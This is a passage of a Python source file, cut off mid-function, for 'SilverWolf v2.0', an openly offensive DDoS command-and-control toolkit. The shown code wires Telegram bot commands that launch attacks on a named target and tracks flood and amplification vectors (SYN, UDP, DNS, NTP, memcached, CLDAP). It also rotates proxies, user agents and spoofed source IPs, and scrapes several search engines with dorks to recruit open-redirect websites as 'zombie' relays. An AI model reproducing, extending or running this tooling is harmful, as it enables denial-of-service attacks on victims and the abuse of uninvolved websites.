#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced C2 Framework - SilverWolf v2.0
Professional-grade toolkit with enhanced vectors, zombie types, evasion, spoofing, and intelligence
Incorporates concepts from UFONet + modern offensive capabilities
"""
import asyncio
import aiohttp
import random
import os
import colorama
import time
import threading
import socket
import ssl
import struct
import sys
import dns.resolver
import dns.exception
import subprocess
import ipaddress
from duckduckgo_search import DDGS
from urllib.parse import urlparse, quote_plus, urljoin, parse_qs, urlencode
import secrets
from scapy.all import *
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import platform
import logging
import sqlite3
from datetime import datetime
import base64
import urllib3
from itertools import cycle
import xmlrpc.client
from bs4 import BeautifulSoup
import signal
import gzip
import io
import hashlib
import json

# Optional modules (handled gracefully if missing)
try:
    from curl_cffi.requests import Session as ImpersonatedSession
    from curl_cffi import CurlHttpVersion
    HAS_IMPERSONATE = True
except ImportError:
    HAS_IMPERSONATE = False
try:
    import telebot
    HAS_TELEBOT = True
except ImportError:
    HAS_TELEBOT = False
try:
    import shodan
    HAS_SHODAN = True
except ImportError:
    HAS_SHODAN = False

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
colorama.init()

class ProgressBar:
    """Simple progress bar for visual feedback."""
    def __init__(self, total, prefix='', suffix='', length=50, fill='█'):
        self.total = total
        self.prefix = prefix
        self.suffix = suffix
        self.length = length
        self.fill = fill
        self.current = 0
        self._lock = threading.Lock()
    def update(self, increment=1):
        with self._lock:
            self.current = min(self.current + increment, self.total)
            percent = ("{0:.1f}").format(100 * (self.current / float(self.total)))
            filled_length = int(self.length * self.current // self.total)
            bar = self.fill * filled_length + '-' * (self.length - filled_length)
            sys.stdout.write(f'\r{self.prefix} |{bar}| {percent}% {self.suffix}')
            sys.stdout.flush()
            if self.current == self.total:
                sys.stdout.write('\n')
                sys.stdout.flush()

class SilverWolfC2:
    def __init__(self):
        self.setup_basic_logging()
        self.fake_ips = [
            '10.0.0.1', '10.0.0.2', '10.0.0.3',
            '172.16.0.1', '172.16.0.2',
            '192.168.1.1', '192.168.1.2'
        ]
        self.user_agents = self.load_user_agents()
        self.proxies = self.load_proxies()
        self.dorks = self.load_dorks()
        self.attack_running = False
        self.attack_stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'requests_sent': 0,
            'start_time': 0
        }
        self.setup_logging()
        self.setup_database()
        self.proxy_cycle = cycle(self.proxies) if self.proxies else None
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        self.attack_module_stats = {
            'icmp_flood': 0,
            'udp_flood': 0,
            'syn_flood': 0,
            'dns_amp': 0,
            'ntp_amp': 0,
            'snmp_amp': 0,
            'ssdp_amp': 0,
            'memcached_amp': 0,
            'cldap_amp': 0,
            'chargen_amp': 0,
            'http_flood': 0,
            'zombie_pingback': 0,
            'zombie_redirect': 0,
            'zombie_generic': 0,
            'zombie_chained': 0
        }
        self.telegram_bot = None
        self.init_telegram_c2()

    def init_telegram_c2(self):
        if not HAS_TELEBOT:
            return
        telegram_token = os.getenv('SILVERWOLF_TELEGRAM_TOKEN')
        if telegram_token:
            try:
                self.telegram_bot = telebot.TeleBot(telegram_token)
                @self.telegram_bot.message_handler(commands=['scan'])
                def handle_scan(message):
                    dork = message.text.split(' ', 1)[1] if ' ' in message.text else 'redirect.php?url='
                    self.scan_for_zombies_with_dork(dork)
                @self.telegram_bot.message_handler(commands=['attack'])
                def handle_attack(message):
                    parts = message.text.split(' ')
                    if len(parts) >= 3:
                        target = parts[1]
                        duration = int(parts[2]) if len(parts) > 2 else 60
                        self.start_telegram_attack(target, duration)
                print(f"{colorama.Fore.GREEN}[+] Telegram C2 initialized")
            except Exception as e:
                if hasattr(self, 'logger'):
                    self.logger.warning(f"Telegram C2 init failed: {e}")

    def scan_for_zombies_with_dork(self, dork):
        self.dorks = [dork]
        self.scan_for_zombies()

    def start_telegram_attack(self, target, duration):
        try:
            resolved_ip = socket.gethostbyname(target)
            asyncio.run(self.start_attack(
                resolved_ip, 80, 10000, 100, duration, False, "all", False, f"http://{target}", False
            ))
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.error(f"Telegram attack error: {e}")

    def signal_handler(self, signum, frame):
        print(f"\n{colorama.Fore.YELLOW}[!] Interrupt received. Shutting down SilverWolf...")
        self.attack_running = False
        if hasattr(self, 'logger'):
            self.logger.info("Shutdown signal received")
        time.sleep(1)
        sys.exit(0)

    def setup_basic_logging(self):
        try:
            if not os.path.exists('logs'):
                os.makedirs('logs')
            logging.basicConfig(
                level=logging.INFO,
                format='%(asctime)s - %(levelname)s - %(message)s',
                handlers=[
                    logging.FileHandler(f'logs/silverwolf_init.log'),
                    logging.StreamHandler(sys.stdout)
                ]
            )
            self.logger = logging.getLogger(__name__)
        except Exception as e:
            print(f"[!] Basic logging setup failed: {e}")
            class DummyLogger:
                def info(self, msg): print(f"[INFO] {msg}")
                def error(self, msg): print(f"[ERROR] {msg}")
                def warning(self, msg): print(f"[WARNING] {msg}")
                def debug(self, msg): pass
            self.logger = DummyLogger()

    def setup_logging(self):
        try:
            logging.basicConfig(
                level=logging.INFO,
                format='%(asctime)s - %(levelname)s - %(message)s',
                handlers=[
                    logging.FileHandler(f'logs/silverwolf_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
                    logging.StreamHandler(sys.stdout)
                ]
            )
            self.logger = logging.getLogger(__name__)
            self.logger.info("SilverWolf logging system initialized")
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.error(f"Full logging setup failed: {e}")

    def setup_database(self):
        try:
            self.db_conn = sqlite3.connect('silverwolf.db', check_same_thread=False)
            cursor = self.db_conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attacks (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target TEXT,
                    port INTEGER,
                    start_time TIMESTAMP,
                    end_time TIMESTAMP,
                    packets_sent INTEGER,
                    bytes_sent INTEGER,
                    requests_sent INTEGER,
                    status TEXT
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS proxies (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    proxy TEXT UNIQUE,
                    status TEXT,
                    last_checked TIMESTAMP,
                    response_time REAL
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS zombies (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    url TEXT UNIQUE,
                    ip TEXT,
                    type TEXT,
                    category TEXT,
                    status TEXT,
                    last_checked TIMESTAMP,
                    response_time REAL,
                    exploit_method TEXT,
                    reliability_score REAL DEFAULT 1.0
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS dork_scan_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    dork TEXT,
                    engine TEXT,
                    timestamp TIMESTAMP,
                    results_count INTEGER
                )
            ''')
            self.db_conn.commit()
            if hasattr(self, 'logger'):
                self.logger.info("Database initialized successfully")
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.error(f"Database initialization failed: {e}")

    def load_user_agents(self):
        try:
            if os.path.exists('useragents.txt'):
                with open('useragents.txt', 'r') as f:
                    agents = [line.strip() for line in f if line.strip()]
                if hasattr(self, 'logger'):
                    self.logger.info(f"Loaded {len(agents)} user agents")
                return agents
            else:
                if hasattr(self, 'logger'):
                    self.logger.warning("useragents.txt not found, using default agents")
                return [
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                ]
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.error(f"Error loading useragents.txt: {e}")
            return ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36']

    def load_proxies(self):
        try:
            if os.path.exists('proxy.txt'):
                with open('proxy.txt', 'r') as f:
                    proxies = []
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            proxies.append(line)
                if hasattr(self, 'logger'):
                    self.logger.info(f"Loaded {len(proxies)} proxies")
                return proxies
            else:
                if hasattr(self, 'logger'):
                    self.logger.warning("proxy.txt not found")
                return []
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.error(f"Error loading proxy.txt: {e}")
            return []

    def load_dorks(self):
        try:
            if os.path.exists('dorks.txt'):
                with open('dorks.txt', 'r') as f:
                    dorks = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                if hasattr(self, 'logger'):
                    self.logger.info(f"Loaded {len(dorks)} dorks")
                return dorks
            else:
                if hasattr(self, 'logger'):
                    self.logger.warning("dorks.txt not found, creating empty file")
                with open('dorks.txt', 'w') as f:
                    pass
                return []
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.error(f"Error loading dorks.txt: {e}")
            return []

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_logo(self):
        logo = """
⠥⠉⡄⠀⠤⠐⢂⡐⠠⡐⠠⡀⠂⡄⠐⠠⠐⣀⣀⣤⣴⣴⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣦⣤⣄⣀⠂⠄⠀⡄⠂⢄⠂⢄⠂⠤⠐⠠⠐⠠⠐⠠⠐⠠⡀⠀⡄⠂⡄
⠆⠃⠤⠘⠠⡘⠠⡀⠡⢀⠡⢀⠡⣀⣥⣶⣿⣿⠿⠿⠛⢋⠉⢉⠉⢠⠀⠄⡄⠠⣀⠂⠄⠂⠄⡉⠩⠉⢛⠛⠿⢿⣿⣶⣧⣄⡈⠄⠈⠤⠈⠤⠘⠠⠌⢡⠈⢡⠈⠁⠄⠃⠄⠃⠄
⡅⠊⡄⠱⢀⠄⢃⠠⢁⠐⣢⣴⣿⣿⠟⠛⠉⡀⠢⢀⠢⠄⠡⠌⠠⢁⠨⠐⠠⢁⡀⠒⡈⠂⠀⠤⠁⡘⠠⡈⠆⡐⢈⠉⠛⠿⣿⣷⣮⣀⠌⡀⠡⢊⠰⢀⠘⢄⠘⢈⠠⠁⡈⠤⠁
⣁⠒⡈⠰⢈⠰⠈⣀⣶⢿⡷⠟⠉⣀⣄⣉⣄⣥⣴⣤⣤⢨⡔⢈⡁⣂⠡⠈⡁⠂⡈⠀⠁⠀⡁⠢⢀⠐⢂⠡⠄⠡⢂⠡⠌⢁⠢⠙⠻⣿⣷⣬⡐⢀⠰⢈⠰⢈⠰⢀⠁⠂⡁⠆⡁
⡁⠢⢀⠡⢀⣠⣾⣿⣿⣯⣶⣾⣺⢿⠿⠿⠿⠛⠛⠋⠛⠞⠿⠿⠻⢟⣽⣿⣶⣦⣥⣀⠀⠆⡈⠀⣀⠐⢀⠡⢈⠐⠄⡐⠌⡀⠆⡁⠆⡈⠙⣿⣿⣦⡐⢀⠰⠈⠠⠂⡉⠄⡀⠆⡀
⠀⠒⢀⢢⣾⣿⣿⣿⠟⠛⠋⢉⠠⠀⠄⠂⡄⠁⠄⢂⠰⠈⡐⡀⠡⢂⠐⡈⢉⠛⠻⢷⣟⣶⣄⡐⢀⠐⠂⠡⠄⠨⠐⡀⠆⢁⠂⡀⠆⡀⠆⡀⠙⢿⣿⣦⡡⠈⠡⠐⠠⢀⠁⠆⡀
⠈⢄⣶⣷⡿⢗⡉⢂⠄⠃⡌⠂⡄⠉⡄⠃⢄⠑⢠⠁⢂⡐⢠⠘⢠⠈⢂⠄⠃⡄⠉⡀⠉⠛⢿⣻⣶⣌⠐⢁⠌⠂⡌⠐⡈⠂⠤⠑⣀⠑⡠⠐⢡⠀⠛⢿⣿⣦⠁⡌⠂⠄⠈⡄⠐
⠐⠸⠟⢋⠐⢠⠐⠂⡌⢂⠐⠂⡄⠃⢠⢘⣤⣶⣦⡒⢀⠐⢠⠈⠂⡌⢂⡈⠂⡄⠃⢠⠑⣀⠂⢌⠻⣹⣷⣂⡀⢃⠀⠃⡄⠃⡄⠃⠄⠒⣀⠑⢠⠐⠡⠀⠛⣿⣷⡄⠂⠄⠃⡠⠁
⠈⠄⠒⠠⠘⠀⡌⢂⠐⠠⡈⠂⠄⠘⣴⣿⣿⣿⣿⣿⣦⡘⢀⠌⢂⠐⢂⠠⠁⡄⠃⡀⠒⠠⠈⠄⠐⢈⠻⣻⣷⣄⠈⠂⠄⠡⡀⠃⡄⠃⡄⠘⠠⠈⠤⠘⢠⠈⢿⣿⣆⠄⠃⣀⠂
⠃⡄⠃⡄⠁⠃⠐⢠⠈⢡⠀⢡⠈⣿⡏⠐⠀⠙⣿⡄⠙⣿⣦⠐⢠⠘⢠⠀⠃⡄⢡⠀⠃⡄⠂⣤⠐⠂⠐⠀⣻⣻⡦⠑⠈⠐⢠⠀⠄⢡⠀⠃⣤⠉⡄⠘⠀⠈⡄⢻⣿⣧⠂⠀⡄
⠆⡁⠆⡁⠡⠌⠡⠄⠃⡄⠊⠄⢸⡟⠀⣂⠑⡠⠀⠅⠂⡈⢿⣧⡄⠢⢀⠊⡐⠈⡄⠊⢄⠁⡄⠂⠄⠌⠁⠐⢈⢻⣿⣧⠀⡔⠈⢄⠁⠆⠀⠆⠀⢂⠘⠠⠌⢡⠐⠈⢿⣿⣆⠁⠄
⡆⠁⠤⠘⠠⠌⢡⠘⢠⠀⠃⡌⣿⡧⠑⡀⠒⡀⠃⠤⠑⢠⠀⠻⣿⣧⡄⠂⡄⠃⠄⠑⣀⠒⠠⠑⢀⡐⠡⠐⠠⡀⠹⣿⣷⠀⠁⡄⠊⡄⠉⢄⠘⢠⠘⢠⠘⢠⠈⠠⠈⢿⣿⡆⠠
⠤⠉⢄⠉⢢⠘⠠⠌⠂⠌⢁⠘⣿⡇⠐⠠⠁⡄⠃⠤⠉⠠⠌⢠⠐⠨⠙⠳⣦⣴⣤⣅⡠⠈⠄⠉⠄⡀⠂⡀⠡⢀⠡⠱⣿⣥⠑⠠⠁⠤⠉⠤⠘⠠⠘⢠⠘⢠⠘⠠⠐⠘⣿⣿⡀
⡅⠊⢄⠘⠠⡈⠡⠌⠡⠌⠠⢈⢻⣷⠉⠠⠁⡄⠃⡄⠉⠤⠈⠤⠈⠤⠈⠡⢀⠈⡉⠙⠿⢷⣦⣉⠠⠈⠡⠈⠀⠄⠡⢀⢻⣿⡇⠄⠉⠤⠁⡂⠉⠤⠘⢠⠈⢄⠘⠠⢈⠡⢹⣿⣇
⡄⠃⡄⠊⢄⠰⢁⠨⠄⡘⠠⠀⠌⣿⣇⠄⠃⡀⠆⡀⠃⠄⠱⢀⡑⠠⠁⢅⠠⠁⡄⠃⡈⠄⡉⠻⣷⣮⣀⠑⢈⠐⠡⠀⠌⣿⣿⢈⠰⢀⠡⠠⠉⢄⠘⠠⠘⢀⠘⠠⠀⠆⡈⣿⣿
⣁⠒⡀⠌⢄⡰⢈⡐⠄⡁⢂⢉⡆⡘⣿⣆⠂⡁⠢⢈⠰⢈⠡⢈⢿⣿⡇⠆⡐⠂⡈⠔⡁⠂⠌⠐⡀⠹⢿⣷⣈⡐⢈⠁⢂⢹⣿⡇⠐⡈⠄⡁⠌⢄⠘⢀⠱⢈⠐⠌⡁⠂⡀⢿⣿
⣀⠒⡈⠐⢄⡐⢂⡐⢂⠁⢂⣾⣿⡀⠜⣿⡔⡀⠆⣁⠒⢈⡐⢀⠠⠙⣷⡄⡐⠂⣁⠒⣈⠐⡉⠐⢈⣁⠂⡈⠻⢷⣦⡁⢂⣸⣿⡇⠆⡁⠆⡁⠒⢈⡐⢈⠰⢈⡐⠄⡐⠂⡁⢸⣿
⡀⠆⡁⠌⢠⠐⠄⡐⢀⣰⣿⣿⣿⣿⣶⣾⣷⠀⠰⢀⠐⢂⠐⡈⠰⢈⠠⠛⢀⠒⡀⠢⢀⠒⢀⡁⢂⣻⠆⠐⡈⠠⠙⠿⣦⣸⣿⡇⠐⡀⠆⠀⠑⣀⠐⡈⠰⢀⠠⠂⡀⠆⠀⢺⣿
⡁⠤⠁⢌⠀⠢⠌⠠⠌⣼⡟⢿⣿⣿⣿⣿⣿⡇⢂⠌⠠⠂⠰⠈⠠⠌⢐⡈⠀⠆⡀⠅⠂⡄⠃⠠⠀⠙⣿⣤⡀⢁⠂⠐⡈⠛⢿⣧⡂⠐⡠⠁⢂⠄⠒⡈⠠⠌⢠⠘⠀⠄⠁⢼⣿
⡁⠤⠉⠄⡌⠡⠌⠡⡀⢻⣧⠀⠌⠛⠛⠿⠿⠛⠠⠈⢄⠉⠠⠌⢡⠘⠠⡀⠉⠤⠁⡄⠃⢰⣏⢱⡌⣁⠐⠿⣥⣦⣬⣥⣤⡥⠶⠏⣻⣷⣤⡑⠠⠘⢠⠈⢡⠘⠠⠈⠐⡈⠈⢼⣿
⠃⠤⠉⢄⡐⠡⠌⠡⠀⠙⠿⣷⣤⣑⡀⠂⠄⠁⠤⠉⢠⠈⠡⠌⢠⠈⢡⠀⠉⡄⠃⠤⠑⠠⢻⣿⣿⡛⠛⠷⠶⠶⣶⣶⣶⣶⣾⠿⠛⠛⡉⠁⠤⠉⢠⠘⢠⠘⠠⠌⠁⡄⠁⣾⣿
⠇⡠⠃⢄⠠⠁⡌⠡⠌⠡⠈⠄⡉⠛⠿⣷⣄⠉⠠⠁⡂⠌⠡⠈⠄⠌⠠⠌⠁⠤⠁⠤⠁⣤⣿⡟⠈⠱⡐⠂⡄⢡⢰⡇⢀⠀⣹⣷⣦⣅⣀⣌⣀⠌⢠⠘⠠⠘⢠⠈⠐⡀⢁⣿⣿
⠆⡁⠒⡈⠐⢂⠰⢀⡘⠄⡁⠆⢁⠒⡀⠌⢻⣷⡁⠢⠄⠢⢁⠡⢊⠐⢁⡘⢈⢰⠨⡄⢂⣿⣿⡇⠨⠄⡐⠆⣶⣤⡘⢻⣄⠂⡈⠉⣉⠛⢿⣄⢀⠰⢀⠰⢁⠘⢀⠨⠐⡈⣼⣿⡇
⠆⡁⠆⡁⠡⢊⠐⢂⠐⠌⡐⢈⡀⠆⡁⠂⡁⣿⣿⠠⢈⡐⣀⣐⣀⡰⠈⡀⠂⣹⣶⣷⣾⣿⢿⣧⠐⢈⠠⠂⢹⣿⡟⠛⠛⠛⠁⠆⣀⠂⣨⣝⣧⡔⢈⠐⢈⠰⢈⠐⠄⢡⣿⣿⠀
⠆⡁⠢⢈⠁⠆⠡⠌⡐⠠⠐⢂⡀⠆⡈⠰⢀⣿⡿⢠⣧⠙⠛⠿⣿⣿⣷⣦⣶⣿⣿⣿⡿⣇⠠⢉⠐⢈⡐⠌⠁⢻⣿⣦⡁⠂⡉⠐⡀⠆⡀⠩⢻⣿⡄⠰⢈⠰⠀⠰⢈⣾⣿⠃⠄
⢂⠁⠆⡁⠒⡈⠡⠐⠠⠌⢁⠂⠐⠠⢐⣤⣿⠟⠀⣸⣿⡆⡈⢠⠀⠹⢿⣿⢿⣿⢿⢻⣷⠙⠇⡀⠢⠄⠐⡈⠰⠻⣬⣿⣿⣶⣤⣦⠁⠄⠁⠆⠈⢿⣷⢀⠂⠰⠈⢁⣾⣿⠏⠀⢂
⢀⠘⣀⠐⢡⠑⢡⠈⢡⠈⠂⡌⢈⣴⡿⢋⠁⠄⣳⣿⣿⣧⡔⢂⠘⠠⣐⡏⣼⠃⢌⠁⣉⠒⢠⠐⢁⡈⢡⠐⢁⡐⢀⡙⢿⢿⣷⡀⠒⣀⠃⢄⢳⣼⣿⡆⡘⢠⢘⣾⣿⠏⡀⠉⠄
⣿⣷⣤⡘⢀⠌⠃⡌⠂⠌⢠⢰⣿⡯⠆⡀⠡⠾⣿⣿⡿⢁⡀⠂⠌⠢⠀⠂⡄⠒⣀⠊⠄⠒⠠⠐⢠⠐⢂⡈⢂⠐⠂⠰⣎⣻⣾⣷⡑⣀⠈⡄⠂⠹⣿⣧⠐⣠⣿⣿⠃⠂⠄⠃⠄
⠈⢿⣿⣿⣦⣌⠂⠄⠡⠈⢢⣿⢏⣠⠒⠠⠁⣼⣿⣿⢃⠠⠀⠃⠌⠠⠌⠡⡀⠁⡄⠘⠠⠑⠠⠑⠠⠐⢂⠐⢂⠈⢂⡐⠘⣿⣿⣿⣷⡄⠒⡀⢱⣄⣿⣿⣼⣿⡟⠁⠄⠁⡄⠃⠄
⠀⠄⢻⣿⣿⣿⣿⣤⡃⠘⢸⣿⡿⢃⢀⠃⢧⣿⣿⣧⣿⠀⠣⠘⠠⢃⠸⢀⠀⠇⡀⠇⡀⠇⡀⠇⠄⠃⠄⡘⢀⠸⠀⡀⠄⣿⣿⣿⣿⣿⢀⠃⠘⣿⣿⣿⣿⠟⢀⠘⡀⠃⠀⠤⠀
⠈⢄⠂⠙⢿⣿⣿⡿⣿⣿⣿⡿⣰⠟⢠⠈⣾⣿⣿⣿⣿⣆⢡⡗⠠⠌⢠⠈⠂⡔⠐⠤⠁⡄⠁⢂⠌⢡⠐⠡⡀⠢⣿⡀⠄⣻⣿⣿⡇⡻⠦⠈⢰⣿⣿⠟⠡⠈⢠⠐⠀⡄⠉⡄⠁
⠃⠤⠈⠤⠀⢉⢿⣿⣶⣍⢹⣷⣿⠂⢄⠘⡿⠟⠻⣿⣿⣿⣿⡀⢡⠘⠠⡈⠡⣀⠃⡄⠃⢄⠁⢦⣿⠀⡌⠂⡄⠁⣿⣿⣆⣿⣿⣿⢇⠂⢤⢁⣾⣿⠇⡈⢠⠘⢠⠈⠂⠄⠁⠤⠁
⠋⠄⠑⠠⠉⠂⡗⠨⠻⢿⣿⣿⣿⢐⡄⠂⠄⠂⠄⢻⣿⣿⣿⣧⠂⢘⠠⠄⠁⣄⠒⠠⠁⣸⡇⣸⣿⣆⡀⠡⠐⢂⣿⣿⣿⣿⣿⡿⡀⠊⣼⣿⣿⣿⡆⠐⢠⠘⠠⠈⢐⠠⠉⠄⠁
⠃⡌⠘⠠⠉⠄⡅⠡⠐⠠⠙⢻⣿⣏⠀⡂⠄⠉⡄⠹⣿⡿⣿⣿⣧⣿⣆⠘⢀⣿⡐⠠⠁⣿⣷⣾⣿⣿⣦⡁⢌⣾⣿⣿⡿⣿⣿⠃⠄⠡⣿⣿⡟⡈⠄⡘⠠⠘⢀⠁⠂⠄⠡⠄⠃
⠇⣀⠣⢈⠰⢈⠡⢁⠡⢂⠁⠆⣿⣿⣼⠃⢨⠐⡀⠡⣿⡁⢻⣿⣿⣿⣿⣧⣺⣿⣿⣆⣾⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⡟⠁⠈⣿⠐⡈⢰⣿⣿⠁⠰⢀⠐⢂⠑⢈⠠⢉⠀⠅⡈⠄
⠖⡀⠢⢈⠐⢂⠡⠌⡐⠄⡁⠂⣹⡿⣿⣷⣏⠠⢁⠒⡉⠐⠈⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠠⠘⢿⣿⣿⡿⠋⠄⡁⠆⡁⠆⣁⣾⢋⠃⣈⠰⢈⠰⢈⠐⢂⠁⢂⠈⠄⡁⠆
⠆⡈⠔⡀⡑⢈⡐⢂⠁⢂⡐⢂⡀⠅⣹⠟⣿⣧⢀⠒⢈⠐⢁⠸⣿⠣⠘⣿⣿⣿⠟⣿⣿⠟⠸⢁⠐⡈⠠⢹⡟⢀⡁⠆⣈⠐⣀⠒⠙⠗⣀⠒⢀⡐⢂⡐⢈⡐⠂⡁⠂⡁⠂⡁⠄
⠆⡁⠆⡀⢐⠂⢐⠀⠡⢂⠀⢂⠀⠢⠉⢀⠸⣿⠀⠆⢈⠐⠂⢼⠇⠰⠀⠹⣿⡟⠀⢻⡏⠀⠒⢀⠂⠄⡁⠞⢁⠂⡀⢂⠀⠆⡀⢂⠁⠆⢀⠒⢀⠰⢀⠐⡀⠰⠈⡀⠆⠁⢂⠁⠆
⡇⡰⢄⠁⠂⠌⠡⠌⠡⢀⠊⠄⠘⠠⠁⠤⢸⣟⠈⠄⠁⠂⠌⠠⠈⠐⡈⠐⢸⡧⢀⢉⣿⡊⢀⠂⠰⠈⠠⠌⠠⠐⠠⠂⠉⠤⠁⠤⠁⠆⠁⠤⠈⠤⠐⠠⠈⢡⠈⢠⠈⠐⠄⠃⡄
║                                       ║
║ADVANCED C2 FRAMEWORK ToolKit          ║
║By: Scav-enger                         ║
║Tele: @Ghiddra                         ║
╚═══════════════════════════════════════╝
        """
        print(colorama.Fore.LIGHTBLUE_EX + logo)
        print(colorama.Fore.CYAN + "="*70)
        print(f"{colorama.Fore.WHITE}Advanced C2 Framework - SilverWolf v2.0")
        print(f"{colorama.Fore.WHITE}Enhanced Vectors, Zombies, Spoofing & Intelligence")
        print(colorama.Fore.CYAN + "="*70 + "\n")

    # --- Enhanced Zombie System ---
    def generate_dynamic_dorks(self):
        redirect_params = ['url', 'redir', 'redirect_uri', 'goto', 'next', 'dest', 'destination']
        new_dorks = []
        for dork in self.dorks:
            for param in redirect_params:
                if '=' in dork:
                    key = dork.split('=')[0]
                    new_dorks.append(f"{key}={param}")
                else:
                    new_dorks.append(f"inurl:{param}")
        return list(set(new_dorks))

    def scan_for_zombies(self):
        if not self.dorks:
            print(f"{colorama.Fore.RED}[!] No dorks loaded. Please check dorks.txt")
            return
        print(f"{colorama.Fore.YELLOW}[DEBUG] Testing with dorks: {self.dorks[:2]}")
        print(f"{colorama.Fore.CYAN}[+] Starting zombie scan...")
        print(f"{colorama.Fore.WHITE}Loaded {len(self.dorks)} dorks for scanning")
        all_dorks = self.dorks + self.generate_dynamic_dorks()
        all_dorks = list(set(all_dorks))
        engines = ['duckduckgo', 'bing', 'yandex', 'startpage', 'kagi', 'yahoo']
        print(f"{colorama.Fore.CYAN}[+] Using search engines: {', '.join(engines)}")
        found_urls = []
        total_dorks = len(all_dorks)
        progress = ProgressBar(total_dorks, prefix='Scanning Dorks:', suffix='Complete', length=30)
        session = requests.Session()
        session.headers.update({'User-Agent': random.choice(self.user_agents)})
        for dork in all_dorks:
            if hasattr(self, 'logger'):
                self.logger.info(f"Scanning dork: {dork}")
            for engine in engines:
                try:
                    urls = self.search_engine_scan(session, dork, engine)
                    found_urls.extend(urls)
                    if urls:
                        print(f"{colorama.Fore.GREEN}[✓] Found {len(urls)} URLs from {engine} for dork")
                    self.save_scan_history(dork, engine, len(urls))
                except Exception as e:
                    print(f"{colorama.Fore.RED}[!] Error scanning with {engine}: {e}")
            progress.update()
            time.sleep(random.uniform(0.5, 1.5))
        unique_urls = list(set(found_urls))
        print(f"\n{colorama.Fore.GREEN}[+] Total unique URLs found: {len(unique_urls)}")
        print(f"{colorama.Fore.CYAN}[+] Testing potential zombies...")
        valid_zombies = self.validate_zombies(unique_urls)
        self.save_zombies_to_db(valid_zombies)
        print(f"{colorama.Fore.GREEN}[+] Scan complete! Found {len(valid_zombies)} valid zombies")
        input(f"{colorama.Fore.GREEN}Press Enter to continue...")

    def search_engine_scan(self, session, dork, engine):
        urls = []
        try:
            if engine == 'duckduckgo':
                urls = self.duckduckgo_search(dork)
            elif engine == 'bing':
                urls = self.bing_search(session, dork)
            elif engine == 'yandex':
                urls = self.yandex_search(dork)
            elif engine == 'startpage':
                urls = self.startpage_search(dork)
            elif engine == 'kagi':
                urls = self.kagi_search(dork)
            elif engine == 'yahoo':
                urls = self.yahoo_search(session, dork)
            else:
                if hasattr(self, 'logger'):
                    self.logger.warning(f"Unsupported engine: {engine}")
                return []
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.error(f"Engine {engine} failed for dork '{dork[:30]}...': {e}")
        return urls

    def duckduckgo_search(self, dork):
        urls = []
        try:
            with DDGS() as ddgs:
                results = ddgs.text(dork, max_results=30)
                for r in results:
                    if 'href' in r and r['href'].startswith('http'):
                        urls.append(r['href'])
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.debug(f"DDGS error: {e}")
        return urls

    def bing_search(self, session, dork):
        urls = []
        try:
            search_url = f"https://www.bing.com/search?q={quote_plus(dork)}&count=30"
            headers = {'User-Agent': random.choice(self.user_agents)}
            response = session.get(search_url, headers=headers, timeout=10)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    if href.startswith('http') and 'bing.com' not in href and 'microsoft.com' not in href:
                        urls.append(href)
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.debug(f"Bing error: {e}")
        return urls

    def yandex_search(self, dork):
        urls = []
        try:
            search_url = f"https://yandex.com/search/?text={quote_plus(dork)}"
            response = requests.get(search_url, headers={'User-Agent': random.choice(self.user_agents)}, timeout=10)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                for link in soup.select('a[href^="http"]'):
                    href = link['href']
                    if 'yandex.' not in href and 'captcha' not in href:
                        urls.append(href)
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.debug(f"Yandex error: {e}")
        return urls

    def startpage_search(self, dork):
        urls = []
        try:
            search_url = f"https://www.startpage.com/do/search?query={quote_plus(dork)}"
            response = requests.post(search_url, data={'query': dork}, headers={'User-Agent': random.choice(self.user_agents)}, timeout=10)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                for link in soup.find_all('a', class_='w-gl__result-title'):
                    if link.get('href') and link['href'].startswith('http'):
                        urls.append(link['href'])
        except Exception as e:
            if hasattr(self, 'logger'):
                self.logger.debug(f"Startpage error: {e}")
        return urls

    def kagi_search(self, dork):
        urls = []
